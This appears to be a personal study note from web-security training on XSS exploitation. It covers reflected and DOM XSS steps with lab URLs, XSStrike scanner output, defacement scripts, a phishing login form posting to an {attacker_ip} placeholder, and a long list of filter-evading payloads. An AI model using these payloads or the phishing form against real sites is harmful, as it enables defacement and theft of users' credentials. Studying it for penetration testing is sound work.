---
id: Exploitation
aliases: []
tags:
  - Webapp/Exploitation/Client-Side/XSS/Exploitation
---

# Exploitation

___

<!-- Manual {{{-->
## Manual

<!-- Reflected XSS {{{-->
### Reflected XSS

Enumerate [[General#Reflected XSS|Reflected XSS]]

1. Add test string to see if it's reflected

```sh
test
```

<!-- Example {{{-->
> [!example]-
>
> ![[xss-reflected-test.png]]
>
<!-- }}} -->

2. Add test payload to see if it's included in the source code

```sh
<script>alert(window.origin)</script>
```

<!-- Example {{{-->
> [!example]-
>
> The payload wrapped with a `<script>` tag
> is not rendered by the browser
>
> ![[xss-reflected-alert.png]]
>
> The source code includes the payload
>
> ![[xss-reflected-dev-tools.png]]
>
<!-- }}} -->

3. Visit the reflected page again

- **Payload appears**: XSS vulnerability persistent
- **Payload doesn't appear**: XSS vulnerability non-persistent

4. Verify if the payload is sent as a [[GET]] request

[Firefox DevTools](https://firefox-source-docs.mozilla.org/devtools-user/)

<!-- Example {{{-->
> [!example]-
>
> The payload is sent as a [[GET]] request
>
> ![[xss-reflected-network.png]]
>
<!-- }}} -->

5. Send the URL containing the payload to the victim

<!-- Example {{{-->
> [!example]-
>
> ```sh
> http://154.57.164.83:32399/index.php?task=%3Cscript%3Ealert%28window.origin%29%3C%2Fscript%3E
> ```
>
<!-- }}} -->

<!-- }}} -->

<!-- DOM XSS {{{-->
### DOM XSS

Enumerate [[General#DOM XSS|DOM XSS]]

1. Add test string to see if it's reflected

```sh
test
```

- The input is reflected with a `#` in the input parameter

<!-- Example {{{-->
> [!example]-
>
> ![[xss-dom-parameter.png]]
>
<!-- }}} -->

- No HTTP request is being made to the server

<!-- Example {{{-->
> [!example]-
>
> The input is being processed on the client side
>
> ![[xss-dom-network.png]]
>
<!-- }}} -->

2. Send the URL containing the payload to the victim

<!-- Example {{{-->
> [!example]-
>
> ```sh
> http://154.57.164.81:31850/#task=%3Cimg%20src=%22%22%20onerror=alert(window.origin)%3E
> ```
>
<!-- }}} -->


<!-- }}} -->

<!-- }}} -->

<!-- Automated {{{-->
## Automated

Automated discovery

<!-- Vulnerability Scanners {{{-->
### Vulnerability Scanners

Automated discovery via vulnerability scanners

- [[Nessus]]
- [[Burp Suite]] (*Pro*)
- [[ZAP/General|ZAP]]

<!-- Info {{{-->
> [!info]- Scan Types
>
> - **Passive scan**:
>   Review client-side code for DOM-based vulnerabilities
> - **Active scan**:
>   Send various types of payloads to trigger XSS
>   via payload injection in the page source
>
<!-- }}} -->

<!-- }}} -->

<!-- Tools {{{-->
### Tools

[[XSS Strike]]

```sh
python xsstrike.py -u "<url>"
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
> ```
> ```sh
>         XSStrike v3.1.4
>
> [~] Checking for DOM vulnerabilities
> [+] WAF Status: Offline
> [!] Testing parameter: task
> [!] Reflections found: 1
> [~] Analysing reflections
> [~] Generating payloads
> [!] Payloads generated: 3072
> ------------------------------------------------------------
> [+] Payload: <HtMl%09onPoIntERENTER+=+confirm()>
> [!] Efficiency: 100
> [!] Confidence: 10
> [?] Would you like to continue scanning? [y/N]
> ```
>
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- Attacks {{{-->
## Attacks

<!-- Defacing {{{-->
### Defacing

[Website defacement](https://en.wikipedia.org/wiki/Website_defacement)
changes the visual appearance of a website

Background

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

Background color

```html
<script>document.body.style.background = "#141d2b"</script>
```

HTML code

```js
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```

<!-- Example {{{-->
> [!example]-
>
> Borrowed HTML source code
>
> ```html
> <center>
>     <h1 style="color: white">Cyber Security Training</h1>
>     <p style="color: white">by
>         <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">
>     </p>
> </center>
> ```
>
> Payload (*single line*)
>
> ```html
> <script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
> ```
<!-- }}} -->

Title

```html
<script>document.title = 'HackTheBox Academy'</script>
```

Text

```html
document.getElementById("todo").innerHTML = "New Text"
```

```js
$("#todo").html('New Text');
```

<!-- }}} -->

<!-- Phishing {{{-->
### Phishing

<!-- Example {{{-->
> [!example]-
>
> Example phishing login form
>
> ```html
> <h3>Please login to continue</h3>
> <form action=http://{attacker_ip}>
>     <input type="username" name="username" placeholder="Username">
>     <input type="password" name="password" placeholder="Password">
>     <input type="submit" name="submit" value="Login">
> </form>
> ```
>
<!-- }}} -->

> [!todo]

<!-- }}} -->

<!-- Session Hijacking {{{-->
### Session Hijacking

> [!todo]

<!-- }}} -->

___
<!-- }}} -->

<!-- Payloads {{{-->
## Payloads

XSS Testing payloads

<!-- Payload Databases {{{-->
> [!tip]- Payload Databases
>
> [Payload-Box](https://github.com/payload-box/xss-payload-list) —
> Cross Site Scripting (XSS) Vulnerability Payload List
>
> [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
> — Cross Site Scripting
<!-- }}} -->

<!-- Common Payloads {{{-->
> [!tip]- Common Payloads
>
> Basic Payloads
>
> ```sh
> <script>alert('XSS')</script>
> <scr<script>ipt>alert('XSS')</scr<script>ipt>
> "><script>alert('XSS')</script>
> "><script>alert(String.fromCharCode(88,83,83))</script>
> <script>\u0061lert('22')</script>
> <script>eval('\x61lert(\'33\')')</script>
> <script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
> <object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
> ```
>
> Div payloads
>
> ```sh
> <div onpointerover="alert(45)">MOVE HERE</div>
> <div onpointerdown="alert(45)">MOVE HERE</div>
> <div onpointerenter="alert(45)">MOVE HERE</div>
> <div onpointerleave="alert(45)">MOVE HERE</div>
> <div onpointermove="alert(45)">MOVE HERE</div>
> <div onpointerout="alert(45)">MOVE HERE</div>
> <div onpointerup="alert(45)">MOVE HERE</div>
> ```
>
> Img payloads
>
> ```sh
> <img src=x onerror=alert('XSS');>
> <img src=x onerror=alert('XSS')//
> <img src=x onerror=alert(String.fromCharCode(88,83,83));>
> <img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
> <img src=x:alert(alt) onerror=eval(src) alt=xss>
> "><img src=x onerror=alert('XSS');>
> "><img src=x onerror=alert(String.fromCharCode(88,83,83));>
> <><img src=1 onerror=alert(1)>
> ```
>
> Svg payloads
>
> ```sh
> <svgonload=alert(1)>
> <svg/onload=alert('XSS')>
> <svg onload=alert(1)//
> <svg/onload=alert(String.fromCharCode(88,83,83))>
> <svg id=alert(1) onload=eval(id)>
> "><svg/onload=alert(String.fromCharCode(88,83,83))>
> "><svg/onload=alert(/XSS/)
> <svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
> <svg><script>alert('33')
> <svg><script>alert&lpar;'33'&rpar;
> ```
<!-- }}} -->

[Alert](https://developer.mozilla.org/en-US/docs/Web/API/Window/alert) -
Display an alert dialog with an optional message

```sh
<script>alert(window.origin)</script>
```

<!-- Example {{{-->
> [!example]-
>
> XSS in URL bar
>
> ```sh
> https://example.com/index.php?user=<script>alert(window.origin)</script>
> ```
<!-- }}} -->

[Document Cookie](https://en.wikipedia.org/wiki/HTTP_cookie) -
Get the cookies for the current website

```sh
<script>alert(document.cookie)</script>
```

[Print dialog](https://developer.mozilla.org/en-US/docs/Web/API/Window/print) -
Open the browser's print dialog

```sh
<script>print()</script>
```

[Plain text element](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/plaintext) -
Render everything following the start tag as raw text

```sh
<plaintext>
```

<!-- Example {{{-->
> [!tip]
>
> Confirm injected payload in page source code
>
> ```html
> <div></div><ul class="list-unstyled" id="todo"><ul><script>alert(window.origin)</script>
> </ul></ul>
> ```
<!-- }}} -->

___
<!-- }}} -->
